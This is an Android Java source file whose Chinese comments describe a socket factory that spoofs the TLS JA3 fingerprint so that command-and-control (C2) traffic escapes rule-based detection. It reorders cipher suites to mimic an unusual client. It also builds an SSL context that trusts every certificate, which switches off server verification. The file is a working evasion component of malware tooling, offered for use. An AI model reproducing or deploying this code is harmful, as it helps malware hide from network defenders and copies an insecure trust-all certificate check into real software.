package com.cc.mumac2;

import android.annotation.SuppressLint;
import android.util.Log;

import java.io.IOException;
import java.net.InetAddress;
import java.net.Socket;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLEngine;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

/**
 * JA3 指纹伪装 SSLSocketFactory
 *
 * 通过控制 ClientHello 中密码套件的顺序和集合，改变 JA3 哈希值，
 * 使 C2 通信在 TLS 指纹层面避免被规则检测。
 *
 * 工作原理：
 * - 包装系统默认的 SSLSocketFactory
 * - 在 createSocket 之后立即调用 setEnabledCipherSuites() 和
 *   setEnabledProtocols()，修改客户端 Hello 中的密码套件列表
 * - 不同的套件顺序 → 不同的 JA3 哈希
 */
@SuppressLint({"TrustAllX509TrustManager", "CustomX509TrustManager"})
public class JaaSpoofingSocketFactory extends SSLSocketFactory {
    private static final String TAG = "JA3Spoof";

    private final SSLSocketFactory delegate;
    private final SSLContext sslContext;
    private final String[] ja3CipherSuites;
    private final String[] ja3Protocols;

    /**
     * 创建一个 JA3 伪装 SSLSocketFactory
     *
     * @param cipherSuites 自定义密码套件顺序（决定 JA3），
     *                     null 则使用内置的伪装配置
     */
    public JaaSpoofingSocketFactory(String[] cipherSuites) {
        // 创建信任所有证书的 SSLContext（兼容自签名证书）
        this.sslContext = createTrustAllSSLContext();
        this.delegate = sslContext.getSocketFactory();

        // 选择有效的密码套件
        if (cipherSuites != null) {
            this.ja3CipherSuites = filterAvailable(cipherSuites);
        } else {
            this.ja3CipherSuites = getDefaultSpoofSuites();
        }

        // TLS 版本顺序也影响 JA3
        this.ja3Protocols = filterAvailableProtocols(
            new String[]{"TLSv1.3", "TLSv1.2"}
        );

        Log.d(TAG, "JA3套件数: " + ja3CipherSuites.length);
    }

    /**
     * 内置伪装配置 — 模拟罕见的密码套件顺序
     * 将 ChaCha20 放在 AES 之前，不同于大多数 Android 默认
     */
    private String[] getDefaultSpoofSuites() {
        return new String[]{
            "TLS_CHACHA20_POLY1305_SHA256",
            "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
            "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
            "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
            "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
            "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
            "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
            "TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA",
            "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA",
            "TLS_RSA_WITH_AES_128_GCM_SHA256",
            "TLS_RSA_WITH_AES_256_GCM_SHA384",
            "TLS_RSA_WITH_AES_128_CBC_SHA",
        };
    }

    /**
     * 过滤仅在系统支持的套件，避免设置不支持的值导致崩溃
     */
    private String[] filterAvailable(String[] desired) {
        Set<String> available = new HashSet<>(
            Arrays.asList(delegate.getSupportedCipherSuites()));
        List<String> result = new ArrayList<>();
        for (String s : desired) {
            if (available.contains(s)) {
                result.add(s);
            }
        }
        // 保底：至少有一个套件
        if (result.isEmpty()) {
            result.add(delegate.getSupportedCipherSuites()[0]);
        }
        return result.toArray(new String[0]);
    }

    private String[] filterAvailableProtocols(String[] desired) {
        SSLEngine engine = sslContext.createSSLEngine();
        Set<String> available = new HashSet<>(
            Arrays.asList(engine.getSupportedProtocols()));
        List<String> result = new ArrayList<>();
        for (String s : desired) {
            if (available.contains(s)) result.add(s);
        }
        if (result.isEmpty()) {
            result.add("TLSv1.2");
        }
        return result.toArray(new String[0]);
    }

    /**
     * 信任所有证书的 SSLContext（测试用）
     */
    private static SSLContext createTrustAllSSLContext() {
        try {
            TrustManager[] trustAll = new TrustManager[]{
                new X509TrustManager() {
                    public void checkClientTrusted(X509Certificate[] c, String a) {}
                    public void checkServerTrusted(X509Certificate[] c, String a) {}
                    public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
                }
            };
            SSLContext ctx = SSLContext.getInstance("TLS");
            ctx.init(null, trustAll, new SecureRandom());
            return ctx;
        } catch (NoSuchAlgorithmException | KeyManagementException e) {
            Log.e(TAG, "创建SSLContext失败", e);
            return null;
        }
    }

    /**
     * 在 Socket 上应用 JA3 伪装配置
     */
    private void applyJa3Config(Socket socket) {
        if (socket instanceof SSLSocket) {
            SSLSocket sslSocket = (SSLSocket) socket;
            sslSocket.setEnabledCipherSuites(ja3CipherSuites);
            sslSocket.setEnabledProtocols(ja3Protocols);
        }
    }

    // ==================== SSLSocketFactory 接口 ====================

    @Override
    public String[] getDefaultCipherSuites() {
        return ja3CipherSuites;
    }

    @Override
    public String[] getSupportedCipherSuites() {
        return delegate.getSupportedCipherSuites();
    }

    @Override
    public Socket createSocket(Socket s, String host, int port, boolean autoClose)
            throws IOException {
        Socket socket = delegate.createSocket(s, host, port, autoClose);
        applyJa3Config(socket);
        return socket;
    }

    @Override
    public Socket createSocket(String host, int port)
            throws IOException {
        Socket socket = delegate.createSocket(host, port);
        applyJa3Config(socket);
        return socket;
    }

    @Override
    public Socket createSocket(String host, int port, InetAddress localHost, int localPort)
            throws IOException {
        Socket socket = delegate.createSocket(host, port, localHost, localPort);
        applyJa3Config(socket);
        return socket;
    }

    @Override
    public Socket createSocket(InetAddress host, int port)
            throws IOException {
        Socket socket = delegate.createSocket(host, port);
        applyJa3Config(socket);
        return socket;
    }

    @Override
    public Socket createSocket(InetAddress address, int port,
                               InetAddress localAddress, int localPort)
            throws IOException {
        Socket socket = delegate.createSocket(address, port, localAddress, localPort);
        applyJa3Config(socket);
        return socket;
    }

    @Override
    public Socket createSocket() throws IOException {
        Socket socket = delegate.createSocket();
        // 裸 socket 没有 SSL 层，在后续连接时配置
        return socket;
    }
}
